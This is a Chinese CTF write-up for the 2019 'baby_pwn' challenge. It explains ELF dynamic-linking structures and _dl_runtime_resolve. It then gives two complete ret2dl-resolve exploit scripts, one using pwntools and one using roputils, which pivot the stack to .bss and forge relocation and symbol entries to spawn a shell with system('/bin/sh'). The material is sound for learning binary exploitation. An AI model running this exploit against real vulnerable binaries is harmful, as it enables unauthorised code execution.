---
title: baby_pwn
categories: 
- 2019信息安全竞赛
---
# baby_pwn

## 前言

今年信安竞赛的题，本以为是最简单的一道，结果发现做不来，最后查到这个就在ctf-wiki里，当时自己学wiki的时候这个高级ROP被跳过了。。恶补一下ret2dl-resolve的知识

## 程序逻辑

栈溢出，栈不可执行，没有泄露地址的函数

![main](./1.jpg)

## 背景知识

_dl_runtime_resolve函数是重定位的核心函数，这个函数会在进程运行的时候动态修改引用的函数地址，达到重定位的效果。使用
```bash
objdump ./pwn -d -j .plt
```
可以看到.plt这里会调用0x0804a008，在IDA里可以看到这里存放的是函数的plt表，函数表里存放got表指针，got表里存放的是函数执行的实际地址，在函数执行时才会放进去

![.plt](./2.jpg)

![dyn_table](./3.jpg)

### ELF动态链接的关键section

函数执行时涉及到的Section包括.dynamic、.dynstr、.dynsym、.rel.plt。使用
```bash
readelf -S ./pwn | grep 'dynamic'
```
可以查看其地址为0x08049f14，在IDA中看其内容，这个节中包含了动态链接的信息，需要关注的是DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针

![.dynamic](./4.jpg)

.rel.plt是重定位表，它的每一个成员都是一个结构体，其结构如下：

```c
typedef struct
{
  Elf32_Addr    r_offset; //指向GOT表的指针
  Elf32_Word    r_info;   //r_info >> 8 作为.dynsym的下标去寻找Elf32_Sym的指针
} Elf32_Rel;
```

在函数执行过程中会先用.rel.plt得到函数重定位表项的指针Elf32_Rel，之后rel->r_info >> 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针

![.rel.plt](./5.jpg)

.dynsym是符号表数组，每一个表项是一个结构体，其结构如下：

```c
typedef struct
{
  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
  Elf32_Addr    st_value;
  Elf32_Word    st_size;
  unsigned char st_info; //对于导入函数符号而言，它是0x12
  unsigned char st_other;
  Elf32_Section st_shndx;
}Elf32_Sym; //对于导入函数符号而言，其他字段都是0
```
这里的st_name比较重要，函数执行到最后会用.dynstr + sym->st_name得出符号名字符串指针，在动态链接库查找这个函数的地址，并且把地址赋值给*rel->r_offset，即GOT表，最终调用这个函数

![.dynsym](./6.jpg)

.dynstr存放各种字符串，以'\x00'结尾，在使用过程中按照相对于其基地址的偏移寻址

![.dynstr](./7.jpg)

### 小结

_dl_runtime_resolve函数执行过程：

1. 用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针

2. .rel.plt+第二个参数(rel偏移)得到的结果作为rel表项结构体Elf32_Rel的指针，这里记作rel

3. rel->r_info >> 8作为.dynsym下标，求出当前函数符号表项Elf32_Sym的指针，记作sym

4. .dynstr + sym->st_name得出符号名字符串指针

5. 在动态链接库查找这个函数的地址，并且把地址赋值给*rel->r_offset，即GOT表

6. 调用这个函数

## 漏洞利用

wiki里从简单到复杂讲了很多种攻击方式，这里可以用的是最后一种，我们先使用栈迁移将ROP代码放到bss段，然后在bss上构造假的rel和sym，rel的r_info为fake_sym与.dynsym的距离，r_offset为read或者alarm，fake_sym的st_name为bss上的'system\x00'与.dynstr的距离，bss上写入'/bin/sh\x00'，传地址进去，这里需要注意的是要在bss_addr+0x800的地方写入数据，为了给函数执行腾出空间

## exp.py

```py
#coding=utf-8
from time import sleep
from pwn import *
debug = 1
context.update(arch='i386',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./pwn')
elf = ELF('./pwn')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p,'b* 0x804854a')

def exp():
    rop = ROP('./pwn')
    bss_addr = elf.bss()
    log.success('bss addr => ' + hex(bss_addr))
    offset = 0x2c
    #migration 
    base_stage = bss_addr + 0x800
    rop.raw('a'*offset)
    rop.read(0,base_stage,100)
    rop.migrate(base_stage)
    p.sendline(rop.chain())
    #
    rop = ROP('./pwn')
    sh = '/bin/sh'
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
    #design 
    fake_rel_addr = base_stage + 24
    fake_sym_addr = base_stage + 32
    #size of SYM is 0x10
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10 
    r_info = (index_dynsym << 8) | 0x7
    fake_rel = flat([elf.got['read'],r_info])
    index_rel = (fake_rel_addr-rel_plt) 
    st_name = fake_sym_addr + 0x10 - dynstr
    fake_sym = flat([st_name,0,0,0x12])
    rop.raw(plt0)
    rop.raw(index_rel)#rel offset
    rop.raw('bbbb')#retn addr
    rop.raw(base_stage+82)#binsh_addr
    rop.raw('bbbb')#0
    rop.raw('cccc')#0
    rop.raw(fake_rel)
    rop.raw('a'*align)
    rop.raw(fake_sym)
    rop.raw('system\x00')
    rop.raw((80-len(rop.chain()))*'b')
    rop.raw(sh+'\x00')
    raw_input()
    p.send(rop.chain())
    
    p.interactive()

exp()

```
此外还可以用roputil直接得到填充数据

```py
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./pwn')
context.log_level = 'debug'

rop = ROP('./pwn')
offset = 0x2c
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()

```


## 参考

[pediy](https://bbs.pediy.com/thread-227034.htm)

[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#_5)

